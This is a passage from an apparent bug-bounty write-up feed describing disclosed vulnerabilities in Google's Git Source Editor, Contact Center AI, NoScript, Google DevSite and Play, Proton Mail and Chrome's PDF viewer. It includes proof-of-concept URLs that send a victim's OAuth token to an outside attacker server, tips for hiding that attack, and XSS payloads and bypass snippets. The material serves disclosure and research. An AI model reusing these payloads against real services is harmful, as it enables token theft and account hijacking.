highlighter-rouge">https://edit.chromium.org/edit?repo=android%2Fplatform%2Fbuild%2F&amp;files=platform%2Fbuild%2Frefs%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md&amp;project=android&amp;theme=default&amp;editmode=default&amp;showfilelist=1&amp;showsidebar=1&amp;showfooter=1&amp;quickstart=1&amp;showfeedback=1&amp;autosave=1&amp;file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F</code></p> <p>PoC URL 2, sends creds to PoC server on <code class="language-plaintext highlighter-rouge">https://aogarantiza.com:1337</code> (does not spoof directory listing): <code class="language-plaintext highlighter-rouge">https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Faogarantiza.com%3A1337%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md</code></p> <p>PoC URL 3, sends creds to non-existent hostname: <code class="language-plaintext highlighter-rouge">https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Fexample.example.example%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md</code></p> <p>NOTE: For PoC URL 1 or 2, we highly recommend using a test Google account, since the access token will be sent to <code class="language-plaintext highlighter-rouge">https://aogarantiza.com:1337/1338</code> which is running the PoC server above. The PoC server will update the “About me” (status) field in Chromium Gerrit [2] but does not log the access token.</p> <p>Setup if running PoC server yourself: Run attached server.js with NodeJS (provide your own privkey.pem and fullchain.pem; we generated it using certbot from Let’s Encrypt). The server must run over HTTPS. When running PoCs, replace “aogarantiza.com:1337/1338” in PoC URL 1/2 with the origin of your server.</p> <p>PoC, token sent to attacker server, OAuth app previously authorized scenario: Navigate to PoC URL 1 or 2. After page loads, a token is sent to the attacker’s PoC server.</p> <p>To demonstrate that the token has been stolen, the PoC server updates the user profile’s “About me” field in Chromium Gerrit [2]. To verify this, navigate to <code class="language-plaintext highlighter-rouge">https://chromium-review.googlesource.com/settings/</code> while logged-in to the same Google account and observe the updated field.</p> <p>PoC, token sent to attacker server, OAuth app not authorized scenario: Navigate to PoC URL 1 or 2. Click on “Log in” when prompted by the editor. Go through OAuth flow (select Google account if prompted, then click “Allow” for the OAuth app). After auth is completed, a token is sent to the attacker’s PoC server.</p> <p>To demonstrate that the token has been stolen, the PoC server updates the user profile’s “About me” field in Chromium Gerrit [2]. To verify this, navigate to <code class="language-plaintext highlighter-rouge">https://chromium-review.googlesource.com/settings/</code> while logged-in to the same Google account and observe the updated field.</p> <p>PoC, observing DevTools Network tab: Open a new tab. Open DevTools and switch to the Network tab. Navigate the same tab to PoC URL 1, 2, or 3. If logged out, follow steps 2-3 from the authorized scenario above. After editor loads, observe a request to attacker URL (<code class="language-plaintext highlighter-rouge">https://aogarantiza.com:*</code>) with an access token of the OAuth app [1]. To more easily find the request, use the filter <code class="language-plaintext highlighter-rouge">domain:aogarantiza.com</code> (using the domain actually used in attack)</p> <p>If the server receiving the request does not have the correct CORS headers, the server will still receive the token because the browser still needs to make the request to see which CORS headers (if any) the server will respond with. Therefore the attack is still successful even if you see the request “fail” due to a CORS error. The PoC server sends the appropriate headers, but you can modify the PoC to test the no-CORS-headers scenario.</p> <p>In cases where an attacker knows the victim is already authorized on edit.chromium.org, the attacker can open the specially-crafted URL in a popup/popunder, then navigate away or close the page after the attack is completed. In the PoC URLs above, the attacker URL is also obscured in the URL params where it is less likely to be detected. A shorter, lookalike origin could also be used, such as <code class="language-plaintext highlighter-rouge">gsource[.]co</code>.</p> <p>[1] The OAuth app used by edit.chromium.org is identified as “Android Build Team” when listed in https://myaccount.google.com/permissions, It seems to be the same OAuth app used in https://ci.android.com/edit<br /> [2] Chromium Gerrit: https://chromium-review.googlesource.com</p> <h1 id="impacts">Impacts</h1> <p>The scope of the leaked token is <code class="language-plaintext highlighter-rouge">email profile https://www.googleapis.com/auth/userinfo.profile openid https://www.googleapis.com/auth/gerritcodereview https://www.googleapis.com/auth/androidbuild.internal https://www.googleapis.com/auth/userinfo.email</code> (CLs may contain sensitive information, attacker could submit their own change as the victim, set victim’s display name to a duck emoji)</p> <ul> <li>View and manage your Git repositories</li> <li>View and manage Internal Android Build status and results</li> </ul> <p>Based on testing, token has permissions to read of Google account info, read+write access to most if not all Chromium Gerrit [2] endpoints, including Gerrit profile fields and access to git repositories (directory listings, read, write, etc.). We assume that if a user has access to restricted/internal git repositories, they would be accessible by the attacker with the user’s leaked token. We’re not sure what other permissions the “gerritcodereview” and “androidbuild.internal” scopes provide, This may include access to internal tools used by the repos.</p> <p>e.g. make a commit as user A, review as user B, which is normal process, and approve commit as user C, and it all looks good externally unless one of those people finds it and realizes “hey, I didn’t commit or review that” and maybe hide some tracks if you have some elevated privs like admin or something mumbles something about software supply chain attacks being all the hotness right now.</p> <p>With PoC URL 1, to obscure the attack the directory listing is spoofed to simulate a real directory listing, and a legitimate file is loaded. The directory listing contents can have any reasonable attacker-controlled text in it, although this is of limited use other than to avoid detection of attack.</p> <p>Other instances of the editor may also be affected by this bug. For example, the editor used in the PoC is at <code class="language-plaintext highlighter-rouge">https://edit.chromium.org/edit</code>, but the same editor appears to be hosted at <code class="language-plaintext highlighter-rouge">https://ci.android.com/edit</code>. There may be internal instances of the editor or other public instances we aren’t aware of.</p> <p>Access tokens may expire after a certain time period or can be revoked for other reasons.</p> <p>There’s an embed version of the <a href="https://android-review.googlesource.com/plugins/git_source_editor/static/git_source_editor.html">Git Source Editor</a> that replaces <code class="language-plaintext highlighter-rouge">googlesource.com</code> URLs to <code class="language-plaintext highlighter-rouge">git.corp.google.com</code> (this is because <code class="language-plaintext highlighter-rouge">pluginMode</code> is <code class="language-plaintext highlighter-rouge">true</code>). We are not aware of any way to exploit this type of usage since it’s not using OAuth. Using OAuth can however be forced using the <code class="language-plaintext highlighter-rouge">enable-gis</code> URL parameter.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">state</span><span class="p">.</span><span class="nx">store</span> <span class="o">=</span> <span class="p">{...</span><span class="nx">state</span><span class="p">.</span><span class="nx">store</span><span class="p">,</span> <span class="na">pluginMode</span><span class="p">:</span> <span class="kc">true</span><span class="p">};</span> </code></pre></div></div> <p>Also, there is an <a href="https://gerrit-documentation.storage.googleapis.com/Documentation/3.1.2/config-gerrit.html#plugins.allowRemoteAdmin">interesting feature</a> in Gerrit, which could possibly be exploited to RCE with a jar file (if used with the correct token).</p> <p>Credits:</p> <ul> <li><a href="https://alesandroortiz.com/">Alesandro Ortiz</a> for free server hosting for the PoC and helping with the report.</li> <li><a href="https://websecblog.com/">Thomas Orlita</a> for help with the writeup.</li> </ul></content>
<author>
<name/>
</author>
<summary type="html">A bug in the Git Source Editor, the official browser-based tool by Google for editing files in projects such as Chromium and Android, allowed to leak the user’s OAuth token by redirecting to an attacker-controlled URL supplied in the URL parameters.</summary>
</entry>
<entry>
<title type="html">CCAI</title>
<link href="https://ndevtk.github.io/writeups/2023/03/11/ccai/" rel="alternate" type="text/html" title="CCAI"/>
<published>2023-03-11T00:00:00+00:00</published>
<updated>2023-03-11T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2023/03/11/ccai</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2023/03/11/ccai/"><p><a href="https://cloud.google.com/solutions/contact-center-ai-platform">Contact Center AI (CCAI)</a> is a Contact Center as a Service platform from Google Cloud based of <a href="https://ujet.cx/">UJET</a> <br /> The following was done as part of a <a href="https://www.google.com/about/appsecurity/research-grants/">VRP grant</a> of $500, later increased by $1337</p> <h1 id="agent-xss">Agent XSS</h1> <p>On the agents control panel there was an iframe with the location controlled by the URL parameter <code class="language-plaintext highlighter-rouge">cobrowseDomain</code>, So you could get an XSS by navigating it to a <code class="language-plaintext highlighter-rouge">javascript:</code> URL… also no embedding protection.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="nx">f</span><span class="p">.</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://something.uc1.ccaiplatform.com/agent/?type=popup&amp;popup=cobrowse&amp;cobrowseDomain=javascript:alert(window.origin);%2F%2F</span><span class="dl">'</span><span class="p">;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span> </code></pre></div></div> <h1 id="client-xss">Client XSS</h1> <p>Using the chat message feature of Cloud Contact Center an agent could XSS the user on https://websdk.ujet.co by messaging <code class="language-plaintext highlighter-rouge">https://"onmousemove="alert(window.origin)"</code><br /> This could also be done by setting a custom “Waiting for Agent Assignment Message” like <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert(window.origin)&gt;</code><br /> Because the <a href="https://cloud.google.com/contact-center/ccai-platform/docs/Guide/publication--en?hl=en">SDK</a> used a shared origin of <code class="language-plaintext highlighter-rouge">https://websdk.ujet.co</code> to render all chat sessions from Cloud Contact Center,<br /> Any website with there own chat could hijack a different websites chat session via the window opener.<br /> The origin was also trusted by <a href="https://cobrowse.io/">Cobrowse</a> which is a feature of the SDK.</p> <h1 id="timeline">Timeline</h1> <p>Reported agent xss on Nov 10, 2022 02:13AM (P2/S2)<br /> Marked as fixed on Jan 19, 2023 02:00AM<br /> Reported client xss on Nov 14, 2022 12:25PM (P2/S2)<br /> Blamed UJET on Nov 14, 2022 03:30PM<br /> Marked as fixed on Mar 10, 2023 07:10AM<br /> “cannot provide monetary compensation for CCAI errors reported under the grant” on Apr 18, 2023 10:55AM<br /> Swag rewarded on Apr 19, 2023 01:55PM <img src="https://ndevtk.github.io/writeups/chat.png" alt="Chat" /></p></content>
<author>
<name/>
</author>
<summary type="html">Contact Center AI (CCAI) is a Contact Center as a Service platform from Google Cloud based of UJET The following was done as part of a VRP grant of $500, later increased by $1337</summary>
</entry>
<entry>
<title type="html">NoScript</title>
<link href="https://ndevtk.github.io/writeups/2022/09/01/noscript/" rel="alternate" type="text/html" title="NoScript"/>
<published>2022-09-01T00:00:00+00:00</published>
<updated>2022-09-01T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/09/01/noscript</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/09/01/noscript/"><p><a href="https://noscript.net/">NoScript</a> is a security browser extension installed by default on the Tor Browser that reduces the attack surface of visited websites such as by per site disabling JavaScript and blocking requests to the local area network. It also has cross-site protections such as checking the URL for reflected XSS and asking before opening cross-site popups to avoid timing attacks and other leaks via the opener (Firefox only).</p> <p>Disabling JS works by setting the following <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noscript-marker; script-src 'none'; object-src 'none'; media-src 'none'; font-src 'none'; script-src-elem 'none'; script-src-attr 'none'; worker-src 'none' </code></pre></div></div> <p>So, in order to bypass it you need to find somewhere the CSP is not enforced like <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1291060">this</a> or a PDF.</p> <h1 id="cross-tab-identity-leak-protection">Cross-tab Identity Leak Protection</h1> <p>Due to a flaw in cutting tab ties it did not think tabs where related when there was still a window reference.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">bypassFirefox</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span> <span class="kd">let</span> <span class="nx">win</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">about:blank</span><span class="dl">'</span><span class="p">);</span> <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">100</span><span class="p">));</span> <span class="nx">win</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span> <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">100</span><span class="p">));</span> <span class="nx">win</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span> <span class="k">return</span> <span class="nx">win</span><span class="p">;</span> <span class="p">}</span> </code></pre></div></div> <p>And later… <a href="https://github.com/hackademix/noscript/commit/c22eafc35bfcc379e9323cae67c924dfa1830684">commit</a></p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">open</span><span class="p">();</span> <span class="nx">w</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">console.log("some attack")</span><span class="dl">'</span><span class="p">);</span> <span class="nx">location</span> <span class="o">=</span> <span class="nx">target</span><span class="p">;</span> </code></pre></div></div> <p>And later… (Requires two user interactions)</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">w1</span> <span class="o">=</span> <span class="nx">open</span><span class="p">();</span> <span class="nx">w2</span> <span class="o">=</span> <span class="nx">w1</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span> <span class="nx">w1</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span> <span class="nx">w2</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nx">target</span><span class="p">;</span> </code></pre></div></div> <p>Like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">COOP</a> this does not affect timing attacks on the first navigation.</p> <h1 id="lan-protection">LAN Protection</h1> <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox">Sandboxed content</a> uses the origin of ‘null’ which bypassed the protection.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span> <span class="nx">f</span><span class="p">.</span><span class="nx">srcdoc</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">&lt;img src="http://192.168.1.1/foo"&gt;</span><span class="dl">'</span><span class="p">;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">sandbox</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">allow-scripts</span><span class="dl">'</span><span class="p">;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span> </code></pre></div></div> <p>This was also expanded to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox">top-level documents</a>.</p> <h1 id="policy-spoofing">Policy spoofing</h1> <p>document.baseURI was used to determine the policy for about: and javascript: URLs this could be set to any origin using the html base tag. <a href="https://github.com/hackademix/noscript/commit/ee66b823210933ba80dd38acf122b4bab6bd7be1">commit</a></p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;base</span> <span class="na">href=</span><span class="s">"https://www.example.com/"</span><span class="nt">&gt;</span> </code></pre></div></div></content>
<author>
<name/>
</author>
<summary type="html">NoScript is a security browser extension installed by default on the Tor Browser that reduces the attack surface of visited websites such as by per site disabling JavaScript and blocking requests to the local area network. It also has cross-site protections such as checking the URL for reflected XSS and asking before opening cross-site popups to avoid timing attacks and other leaks via the opener (Firefox only).</summary>
</entry>
<entry>
<title type="html">Google XSS</title>
<link href="https://ndevtk.github.io/writeups/2022/07/26/google-xss/" rel="alternate" type="text/html" title="Google XSS"/>
<published>2022-07-26T00:00:00+00:00</published>
<updated>2022-07-26T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/07/26/google-xss</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/07/26/google-xss/"><h1 id="google-devsite-xss-cloudgooglecom-developersgooglecom-313370">Google DevSite XSS (cloud.google.com, developers.google.com) $3133.70</h1> <p>Due to a vulnerability in the server-side implementation of <code class="language-plaintext highlighter-rouge">&lt;devsite-language-selector&gt;</code> part of the URL was reflected as html so it was possible to get XSS on the origins using that component from the 404 page.<br /> This was found using <a href="https://dalfox.hahwul.com/docs/home/">DalFox</a> which kept finding the same bug due to it being the “not found” page.</p> <p>https://developers.google.com/foo%22%3E%3Cimg%20src=x%3E%3C/a%3E%3C/li%3E%3C/ul%3E%3C/devsite-language-selector%3E%3Ch1%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/a https://cloud.google.com/foo%22%3E%3Cimg%20src=x%3E%3C/a%3E%3C/li%3E%3C/ul%3E%3C/devsite-language-selector%3E%3Ch1%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/a</p> <h1 id="google-play-xss-playgooglecom--5000">Google Play XSS (play.google.com) $5000</h1> <p>On the search page of google play console vulnerable code was run when the search resulted in an error.<br /> Getting an error was simple as doing <code class="language-plaintext highlighter-rouge">/?search=&amp;</code> and because <code class="language-plaintext highlighter-rouge">window.location</code> includes the hash which never encodes <code class="language-plaintext highlighter-rouge">'</code> it’s possible to escape the href context and set other html attributes, unlike the DevSite XSS this is prevented by the CSP but was still awarded more by the panel.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">b</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">(</span><span class="sr">{query}</span><span class="se">)</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&lt;a href='</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'&gt;</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">.</span><span class="nx">g</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&lt;/a&gt;</span><span class="dl">"</span><span class="p">);</span> </code></pre></div></div> <p>https://play.google.com/console/about/search-results/?search=&amp;#’onclick=alert(document.domain)//</p> <p>The writeups are referenced on <a href="https://portswigger.net/daily-swig/xss-vulnerabilities-in-google-cloud-google-play-could-lead-to-account-hijacks">PortSwigger</a></p></content>
<author>
<name/>
</author>
<summary type="html">Google DevSite XSS (cloud.google.com, developers.google.com) $3133.70 Due to a vulnerability in the server-side implementation of &lt;devsite-language-selector&gt; part of the URL was reflected as html so it was possible to get XSS on the origins using that component from the 404 page. This was found using DalFox which kept finding the same bug due to it being the “not found” page.</summary>
</entry>
<entry>
<title type="html">Proton part 2</title>
<link href="https://ndevtk.github.io/writeups/2022/07/26/proton-2/" rel="alternate" type="text/html" title="Proton part 2"/>
<published>2022-07-26T00:00:00+00:00</published>
<updated>2022-07-26T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/07/26/proton-2</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/07/26/proton-2/"><h1 id="user-ip-address-leaked-on-email-open">User IP address leaked on email open.</h1> <p>Normally attacker-controlled email content is in a sandboxed iframe that can’t run javascript and the html is sanitized with DOMPurify.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">title=</span><span class="s">"Email content"</span> <span class="na">src=</span><span class="s">"about:blank"</span> <span class="na">scrolling=</span><span class="s">"yes"</span> <span class="na">frameborder=</span><span class="s">"0"</span> <span class="na">class=</span><span class="s">"w100"</span> <span class="na">data-testid=</span><span class="s">"content-iframe"</span> <span class="na">data-subject=</span><span class="s">"(No Subject)"</span> <span class="na">sandbox=</span><span class="s">"allow-same-origin allow-popups allow-popups-to-escape-sandbox"</span> <span class="na">style=</span><span class="s">"height: 58px;"</span><span class="nt">&gt;&lt;/iframe&gt;</span> </code></pre></div></div> <p>To prevent HTTPLeaks values that would normally cause remote requests such as “src” and “url()” are prefixed with “proton-“.<br /> If the user allows remote content to be loaded and the request is an image a proxy may be used to avoid sharing the users IP address.<br /> But the CSS sanitization was missed if in an SVG tag, this could be exploited by the attacker to bypass privacy protections using a html contained email.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;svg&gt;</span> <span class="nt">&lt;style&gt;</span> <span class="nt">circle</span> <span class="p">{</span> <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url(https://http.cat/200)</span><span class="p">;</span> <span class="p">}</span> <span class="nt">&lt;/style&gt;</span> <span class="nt">&lt;circle&gt;&lt;/circle&gt;</span> <span class="nt">&lt;/svg&gt;</span> </code></pre></div></div> <h1 id="link-confirmation-bypass">Link confirmation bypass</h1> <p>If a link did not start with the regex <code class="language-plaintext highlighter-rouge">/^https?:\/\//</code> it would be treated as internal this meant something like Https:// would bypass the check.</p> <h1 id="this-message-contains-remote-content-bypass">“This message contains remote content” bypass</h1> <p>By spoofing an email from a whitelisted address such as <code class="language-plaintext highlighter-rouge">no-reply@news.protonvpn.com</code> it’s possible to automatically load remote content.<br /> Exceptions should not be made based of an attacker-controlled value. (Yes even if its sent to spam)</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="kd">const</span> <span class="nx">WHITE_LISTED_ADDRESSES</span> <span class="o">=</span> <span class="p">[</span> <span class="c1">// v3</span> <span class="dl">'</span><span class="s1">notify@protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// v4</span> <span class="dl">'</span><span class="s1">no-reply@news.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@news.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@app.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@offer.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@offer.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@verify.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@partners.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.protonmail.com</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// v5</span> <span class="dl">'</span><span class="s1">no-reply@news.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@news.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@news.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@news.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@mail.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@calendar.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@drive.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@vpn.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@offers.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@offer.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@notify.protonvpn.com</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@verify.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@recovery.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@partners.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">no-reply@referrals.proton.me</span><span class="dl">'</span><span class="p">,</span> <span class="p">];</span> </code></pre></div></div></content>
<author>
<name/>
</author>
<summary type="html">User IP address leaked on email open. Normally attacker-controlled email content is in a sandboxed iframe that can’t run javascript and the html is sanitized with DOMPurify. &lt;iframe title="Email content" src="about:blank" scrolling="yes" frameborder="0" class="w100" data-testid="content-iframe" data-subject="(No Subject)" sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox" style="height: 58px;"&gt;&lt;/iframe&gt; To prevent HTTPLeaks values that would normally cause remote requests such as “src” and “url()” are prefixed with “proton-“. If the user allows remote content to be loaded and the request is an image a proxy may be used to avoid sharing the users IP address. But the CSS sanitization was missed if in an SVG tag, this could be exploited by the attacker to bypass privacy protections using a html contained email. &lt;svg&gt; &lt;style&gt; circle { background-image: url(https://http.cat/200); } &lt;/style&gt; &lt;circle&gt;&lt;/circle&gt; &lt;/svg&gt;</summary>
</entry>
<entry>
<title type="html">PDF Page count leak (Awarded $500)</title>
<link href="https://ndevtk.github.io/writeups/2022/07/02/pdf-page-count-leak/" rel="alternate" type="text/html" title="PDF Page count leak (Awarded $500)"/>
<published>2022-07-02T00:00:00+00:00</published>
<updated>2022-07-02T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/07/02/pdf-page-count-leak</id>
<content type="html" xml:base="https://ndevtk.github.io/writeups/2022/07/02/pdf-page-count-leak/"><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1306443">Issue 1306443</a></p> <p>On chrome the PDF viewer has a message listener that’s used for the cross-origin scripting API.<br /> By sending a message to the viewer with the type of <code class="language-plaintext highlighter-rouge">getThumbnail</code> and a page number that’s greater then the number of available pages it would crash to prevent OOB access.</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf</span><span class="dl">'</span><span class="p">);</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">_</span> <span class="o">=&gt;</span> <span class="nx">w</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">postMessage</span><span class="p">({</span><span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">getThumbnail</span><span class="dl">'</span><span class="p">,</span> <span class="na">page</span><span class="p">:</span> <span class="dl">'</span><span class="s1">1337</span><span class="dl">'</span><span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">),</span> <span class="mi">1000</span><span class="p">);</span> </code></pre></div></div> <p>This crash can be detected cross-origin in the following ways</p> <ul> <li>Checking device performance like with <a href="https://devicemonitor.glitch.me/">devicemonitor</a> after <code class="language-plaintext highlighter-rouge">w[0].postMessage({type: 'print'});</code></li> <li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1307087">Issue 1307087</a></li> <li>Extension tabs API looking for the status of unloaded (no permission needed)</li> </ul></content>
<author>
<name/>
</author>
<summary type="html">Issue 1306443</summary>
</entry>
<entry>
<title type="html">AutoFill UI spoof (Awarded $1000)</title>
<link href="https://ndevtk.github.io/writeups/2022/06/05/autofill/" rel="alternate" type="text/html" title="AutoFill UI spoof (Awarded $1000)"/>
<published>2022-06-05T00:00:00+00:00</published>
<updated>2022-06-05T00:00:00+00:00</updated>
<id>https://ndevtk.github.io/writeups/2022/06/05/autofill</id>
